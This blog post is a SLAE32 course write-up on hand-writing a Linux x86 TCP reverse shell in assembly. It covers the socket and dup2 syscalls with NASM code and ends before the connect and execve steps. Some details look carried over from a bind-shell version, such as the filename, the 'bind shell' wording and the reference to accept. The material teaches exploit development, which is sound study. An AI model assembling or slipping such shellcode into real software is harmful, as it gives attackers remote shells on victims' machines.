---
layout: single
title: TCP Reverse Shell for Linux x86
date: 2019-9-19
classes: wide
header:
  teaser: /assets/images/OSCP/pwk.png
tags:
  - Assembly
  - Pentester Academy
  - SLAE32
  - Reverse Shell TCP
  - Certifications
--- 
![](/assets/images/SLAE32/shellcoding32.png)

## Introduction
How many time you used the msfvenom command to craft a reverse shell for your scopes?
In my case, many times but all i have to do is give to msfvenom the right inputs and voil√†, it gives us the shellcode ready to use.
We have already learnd how to build a bind shellcode in the [previous post](https://bolonobolo.github.io/SLAE32-1/), in this article we would inspect the shellcode process to craft a tcp reverse shell in depth, written to analyse what are the components needed to build a x86 Linux shellocode. 
This is also the second assignment from Viviek Ramchandran's SLAE32 course.<br>
The first part of the assignment request to create a Shell_Reverse_TCP shellcode with these properties:
- Reverse connects to configured IP and Port
- Execs Shell on sucessfull connection

The second part request to create a script to make IP and port number easily configurable.<br>
According with [Infosec Institute](https://resources.infosecinstitute.com/icmp-reverse-shell/), reverse shell could be defined like a back connection from the victim to the attacker, in this case most of the rules of a potential firewall behind the victim are useless.
> *A reverse shell is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using, code or command execution is achieved.* <br>
The last video lesson of SLAE course analyzes a tcp reverse shell payload created with msfvenom so the creation process is well documented like the shell structure, so the effort for this assignment is to pickup informations about all the syscalls needed for the tcp reverse shell using the linux kernel unistd.h header and the ```man 2``` command.
We will use also the book 
[Unix Network Programming](https://www.amazon.com/UNIX-Network-Programming-Richard-Stevens/dp/0139498761), foundamental to learn the substructures required in some syscalls.
We start reviewing the case study in the course and reading the png created with sctest of libemu tool suite, with that informations we can extract the syscalls needed to build our reverse shellcode:

- socket
- dup2 (3 times)
- connect
- execve

we could simply copy the assembly code, but this is not the scope of the Viviek's assignment. What he would to obtain with the assignment is to understand how we should develop a shellcode, starting from learn the linux syscalls, what we need to complete assignment and how we can transform the syscall and its argument in assembly code.<br>
Has said before we have already learnd how to build a bind shellcode in the [previous post](https://bolonobolo.github.io/SLAE32-1/), but i think a review couldn't damage us, so let's start the fun part.

## SOCKET
We can start searching the socket syscall by cat'ting the unistd_32 headers of the linux kernel, then check the socket syscall man page.<br>
![](/assets/images/SLAE32/assignment_1/socket_1.png)<br>
```C
man 2 socket
```
```C
int socket(int domain, int type, int protocol);
```
Mmm, seems the socket accept 3 arguments, now we can check also the book to learn what's the role of there arguments.<br>
```int domain``` specifies a communication domain, this means that it specifies the Address Family (AF_xxxx) wich will be used for communication.<br>
```int type``` specifies the communication semantics.<br>
Not all combinations of socket domain and type are valid, we want a TCP bind shell, so according to the book, our choices has to be ```AF_INET``` for the domain and ```SOCKET_STREAM``` for the type.<br>
![](/assets/images/SLAE32/assignment_1/socket_0.png)<br>
According to what we have studied in the course, the informations found with the ```man 2``` command has to be distribuited with the criteria here explained.
Syscall number has to go in the EAX register, ```int domain``` should be ```AF_INET``` that means a value of 2 saved in the EBX register, ```int type``` should be ```SOCK_STREAM```, that means a value of 1 saved in the ECX register, last ```int protocol``` should be 0 and placed in EDX register.<br>
![](/assets/images/SLAE32/assignment_1/socket_2.png)
![](/assets/images/SLAE32/assignment_1/socket_3.png)<br>
Now that we have indentified the socket syscall arguments, what have to be they values and in what register they has to be pushed we can proceed writing the assembly code.
Note that the socket syscall return an output that is the pointer to the socket itself and will be stored in EAX register, so in order to recover the pointer to the socket for future uses we have to move it in a safer place like the EDI register.
```nasm
; Filename: bind_shell.nasm
; Author:  SLAE-1476
; twitter: @bolonobolo
; email: bolo@autistici.org / iambolo@protonmail.com

global _start

section .text
_start:

    ; SOCKET
    ; xoring the registers
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
    mov cl, 0x01
    mov bl, 0x02
    mov ax, 0x167
    int 0x80

    ; move the return value of socket from EAX to EDI
    mov edi, eax
```
Well, we can move to the next syscall.

## DUP
We need to find the value of the syscall and consult the man page.
![](/assets/images/SLAE32/assignment_1/dup_0.png)<br>
![](/assets/images/SLAE32/assignment_1/dup_1.png)<br>
The dup() system call creates a copy of the file descriptor oldfd, using the lowest-numbered unused descriptor for the new descriptor.
Another simple syscall, in EAX we store the hexadecimal value of 63, 0x3f, in EBX we store the address of the accepted connection by ```accept``` syscalll and saved in EDI register, last in ECX we have to save the value of all possibly file descriptor, in UNIX system they are stdin, stdout and stderr, respectively with value 0, 1 and 2.
In this case we have to execute the dup2 syscall 3 times, for stdin, stdout and stderr, using a loop.<br>
Here's the assembly code

```nasm
	; DUP2
    xor ebx, ebx
    xor ecx, ecx
    mov cl, 0x3

dup2:
    xor eax, eax
    mov ebx, edi
    mov al, 0x3f
    dec cl
    int 0x80
    jnz dup2
```

